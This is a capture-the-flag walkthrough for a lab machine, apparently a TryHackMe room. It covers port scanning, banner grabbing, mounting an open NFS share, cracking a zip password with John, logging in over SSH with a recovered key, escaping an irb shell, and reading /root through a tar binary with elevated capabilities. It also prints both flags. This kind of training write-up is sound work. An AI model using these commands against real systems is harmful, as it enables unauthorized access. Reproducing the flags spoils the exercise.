CTF URL:
# IP
```
10.10.240.128
```
# Reconaisance
## NMAP
```bash
nmap -p- -T4 10.10.240.128 -v
# hell a lot of ports
```
so lets start with 1337  as said in the room's description
# Ports
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nv 10.10.240.128 1337                                                   
(UNKNOWN) [10.10.240.128] 1337 (?) open
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports  
```

```bash
for i in range {1..100}; do echo "Port:$i "; nc -nv 10.10.240.128 $i; done
...
550 12345 0000000000000000000000000000000000000000000000000000000Port:3 
550 12345 0000000000000000000000000000000000000000000000000000000Port:4 
550 12345 0000000000000000000000000000000000000000000000000000000Port:5 
550 12345 0000000000000000000000000000000000000000000000000000000Port:6 
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00Port:7 
550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff00Port:8 
550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff00Port:9 
550 12345 0ffffffffff80000088808000000888800000008887ffffffffff00Port:10 
550 12345 0fffffffff70000088800888800088888800008800007ffffffff00Port:11 
550 12345 0fffffffff000088808880000000000000088800000008fffffff00Port:12 
550 12345 0ffffffff80008808880000000880000008880088800008ffffff00Port:13 
550 12345 0ffffffff000000888000000000800000080000008800007fffff00Port:14 
550 12345 0fffffff8000000000008888000000000080000000000007fffff00Port:15 
550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00Port:18 
550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff00Port:19 
550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff00Port:20 
550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf00Port:21 
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00Port:22 
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00Port:23 
550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff00Port:24 
550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff00Port:25 
550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00Port:26 
550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff00Port:27 
550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff00Por
550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff00Port:29 
550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff00Port:30 
550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff00Port:31 
550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff00Port:32 
550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff00Port:33 
550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff00Port:34 
550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff00Port:35 
550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff00Port:36 
550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff00Port:37 
550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff00Port:38 
550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff00Port:39 
550 12345 0fffffffffffffff800888880000000000000000000800800cfff00Port:40 
550 12345 0fffffffffffffffff70008878800000000000008878008007fff00Port:41 
550 12345 0fffffffffffffffffff700008888800000000088000080007fff00Port:42 
550 12345 0fffffffffffffffffffffc800000000000000000088800007fff00Port:43 
550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff00Port:44 
550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff00Port:45 
550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff00Port:46 
550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff00Port:47 
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00Port:48 
550 12345 0000000000000000000000000000000000000000000000000000000Port:49 
550 12345 0000000000000000000000000000000000000000000000000000000Port:50 
550 12345 0000000000000000000000000000000000000000000000000000000Po
...
Port:76 
(UNKNOWN) [10.10.240.128] 76 (?) open
HTTP/1.0 401 Unauthorized
Server: httpd
Date: e
WWW-Authenticate: Basic realm="SimpleShare (default user name is admin and password is simple)"
...
```
going to 12345
```
┌──(kali㉿kali)-[~]
└─$ nc -nv 10.10.240.128 12345                                                
(UNKNOWN) [10.10.240.128] 12345 (?) open
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan   
```
## NFS Share and unzip with John
which is 2049
```bash
# find available folders
showmount -e 10.10.240.128
Export list for 10.10.240.128:
/home/nfs *
# mount 
mkdir /mnt/new_back
mount -t nfs 10.10.240.128:/home/nfs /mnt/new_back -o nolock
# and inside it we can find backup
cd /mnt/new_back 
ll
total 8
-rw-r--r-- 1 root root 4534 Sep 15  2020 backup.zip
```
it requires password
```bash
zip2john backup.zip > hash
john hash 
zxcvbnm          (backup.zip)  
```
after unzip there are some interesting files
```
┌──(root㉿kali)-[/home/…/Documents/home/hades/.ssh]
└─# ll
total 20
-rw-r--r-- 1 root root  736 Sep 15  2020 authorized_keys
-rw-r--r-- 1 root root   33 Sep 15  2020 flag.txt
-rw-r--r-- 1 root root   10 Sep 15  2020 hint.txt
-rw------- 1 root root 3369 Sep 15  2020 id_rsa
-rw-r--r-- 1 root root  736 Sep 15  2020 id_rsa.pub

```
## SSH with id_rsa
```bash
cat flag.txt 
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}

cat hint.txt 
2500-4500
```
ssh to the server with `hades` and `id_rsa`
```bash
# instead of for loop lets do jobs in parallel
seq 2500 4500 | parallel -j 252 ssh hades@10.10.240.128 -p {} 2> res
```
eventually
```bash
ssh hades@10.10.240.128 -i id_rsa -p 3333
...
 irb(main):001:0> 
irb(main):002:0> 
```
it is interactive ruby shell, lets leave to bash
```
%x( bash )
hades@hell:~$ 
# not that good
exec '/bin/bash'
# good
```
# Root
```bash
hades@hell:~$ getcap -r / 2>/dev/null

/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep

```
- https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
```bash
/bin/tar cvf sec.tar /root
ls
/bin/tar -xvf sec.tar
hades@hell:/tmp/root$ cat root.txt 
thm{w0w_n1c3_3sc4l4t10n}
```